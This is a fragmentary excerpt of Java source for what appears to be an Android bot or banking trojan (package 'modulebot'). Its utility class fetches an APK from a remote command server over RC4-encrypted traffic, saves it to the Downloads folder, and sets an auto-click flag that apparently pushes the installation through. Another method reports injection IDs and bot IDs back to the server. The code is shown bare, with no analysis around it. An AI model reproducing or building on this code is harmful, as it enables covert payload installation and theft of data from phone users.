...
import com.service.modulebot.API.ClassRC4;
import com.service.modulebot.API.RequestHttp;
...
public class utils {
    ...
    public void installApp(final Context context, final String app){
        JSONObject jsonDownloadApp = new JSONObject();
        try {
            jsonDownloadApp.put("app", app);
        } catch (JSONException e) {
        }
        String base64 =  trafDeCr(context, httpRequest(context, "action=getinstallapk&data=" + trafEnCr(context, jsonDownloadApp.toString())));
        Log("installapp","installing app");
        byte[] imageAsBytes = new byte[0];
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO) {
            imageAsBytes = Base64.decode(base64, Base64.DEFAULT);
        }

        File file = new File("/sdcard/Download/" + app);
        try {
            if (!file.exists()) {
                file.createNewFile();
            }
            ...
            SettingsWrite(context.getApplicationContext(),"installapk", "1");
            SettingsWrite(context, consts.autoClick, "1");
            ...
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO) {
                ...
                mHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        File file2 = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), app);
                        Uri apkUri = FileProvider.getUriForFile(context, context.getPackageName(), file2);
                        Log.d("installapp", apkUri.toString());
    ...
    public String sendLogsInjection(Context context, String id, String data, String idbot){
        ...
        try {
            ...
            request.put("tag", SettingsRead(context, consts.tag));

            Log("SEND",  "idinject: " + id);
            Log("SEND",  "idbot: " + idbot);
            Log("SEND", "tag: " + SettingsRead(context, consts.tag));
    ...
    public void SettingsToAddJson(Context context, String name, String params){
        try{
            ...
            Log("JSON","ERROR SettingsToAddJson: " + ex.toString());
            SettingsWrite(context, name,  params);
        }
    }
